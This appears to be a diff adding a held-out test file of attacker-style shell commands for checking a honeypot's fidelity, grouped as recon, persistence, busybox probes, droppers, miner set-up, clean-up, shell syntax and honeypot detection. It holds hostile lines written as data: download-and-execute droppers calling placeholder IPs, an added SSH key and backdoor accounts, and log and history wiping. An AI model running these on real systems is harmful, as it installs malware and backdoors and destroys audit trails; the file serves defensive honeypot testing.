@@ -1,0 +1,87 @@
+# Held-out bot-style command lines for the fidelity check.
+#
+# Written after the fixes driven by corpus.txt, and run against the honeypot
+# once, unchanged, for the number in the README. Same format and rules as
+# corpus.txt. Lines whose answer depends on the machine profile, on systemd,
+# or on the container itself (pid 1, no network devices) are left out.
+
+## recon
+same	cat /etc/issue.net
+exact	getconf LONG_BIT
+same	cat /proc/version | cut -d' ' -f3
+same	df -h / | tail -n 1 | awk '{print $4}'
+same	ls -la /root | head -n 5
+exact	id root
+same	cat /proc/meminfo | grep MemFree | awk '{print $2}'
+same	ps -ef | grep -c sshd
+exact	echo $HOME $USER
+same	uname -r | cut -d. -f1-2
+same	nproc --all
+same	cat /etc/hostname
+same	ls /etc/*release*
+same	lscpu | grep -i "^architecture"
+same	which python3 perl curl wget
+same	whereis bash
+same	env | grep -c PATH
+
+## persistence
+exact	mkdir -p /root/.ssh && chmod 700 /root/.ssh && ls -ld /root/.ssh | cut -c1-10
+same	echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCholdout test" >> ~/.ssh/authorized_keys; wc -l < ~/.ssh/authorized_keys
+same	useradd -m -s /bin/bash support 2>/dev/null; id support | cut -d' ' -f1
+exact	useradd -m helpdesk && echo "helpdesk:P4ssw0rd!" | chpasswd && echo ok
+same	crontab -l 2>/dev/null | grep -c reboot
+
+## busybox probes
+exact	/bin/busybox echo -e "\x6b\x61\x6d\x69"
+same	/bin/busybox cat /proc/cpuinfo | grep -c processor
+exact	cd /dev/shm; echo -e "\x41\x42" > .t; cat .t; rm -f .t
+same	/bin/busybox tftp; /bin/busybox wget; /bin/busybox ECCHI
+
+## droppers
+net	cd /tmp; curl -O http://192.0.2.44/sshd; chmod +x sshd; ./sshd
+net	wget -O /tmp/.cache http://198.51.100.9/c; chmod 755 /tmp/.cache; nohup /tmp/.cache >/dev/null 2>&1 &
+net	(curl -fsSL http://203.0.113.5/i.sh || wget -q -O- http://203.0.113.5/i.sh) | bash
+net	cd /var/tmp && busybox wget http://192.0.2.8/a.sh && sh a.sh
+
+## miner set-up
+same	sysctl -n vm.nr_hugepages
+exact	ps aux | grep -v grep | grep -c -i -E "xmrig|kinsing|kdevtmpfsi"
+exact	ls /etc/ld.so.preload 2>/dev/null || echo none
+exact	echo "vm.nr_hugepages=128" >> /etc/sysctl.conf && tail -n 1 /etc/sysctl.conf
+same	free -g | awk 'NR==2{print $2}'
+same	ulimit -u
+
+## clean-up
+exact	rm -rf /var/log/wtmp /var/log/btmp; echo $?
+same	unset HISTFILE HISTSIZE; history -w; echo done
+exact	find /tmp -maxdepth 1 -name ".*" -type f -delete; echo ok
+exact	> ~/.bash_history && echo cleared
+
+## shell syntax
+exact	a=5; b=$((a*3)); echo "$a $b"
+same	for f in /etc/host*; do echo $f; done | head -n 2
+exact	x=$(echo hello | tr a-z A-Z); echo ${x:0:3}
+exact	case $(uname -m) in x86_64) echo amd64;; *) echo other;; esac
+exact	i=0; while [ $i -lt 3 ]; do i=$((i+1)); done; echo $i
+exact	echo "a b" | while read x y; do echo "$y $x"; done
+exact	test -d /proc && echo dir
+exact	[[ -n "$PATH" ]] && echo set
+exact	echo ${#HOME}
+exact	printf "%s:%s\n" $(whoami) $(id -u)
+exact	cat <<< "hi there"
+exact	ls /nonexistent 2>/dev/null; echo "code=$?"
+exact	echo $(( 7 / 2 )) $(( 7 % 2 ))
+exact	echo one two three | awk '{print NF}'
+exact	sort -n <<< $'3\n1\n2' | head -n 1
+
+## is it a honeypot?
+same	ls -la /bin
+same	stat -c %s /bin/ls
+same	uptime -p
+same	mount | grep -c " / "
+exact	which honeypot cowrie kippo; echo $?
+same	ls /usr/bin | wc -l
+same	cat /etc/shells | grep -c bash
+exact	getent passwd root
+exact	date +%Y | wc -c
+same	ls -l /proc/self/exe
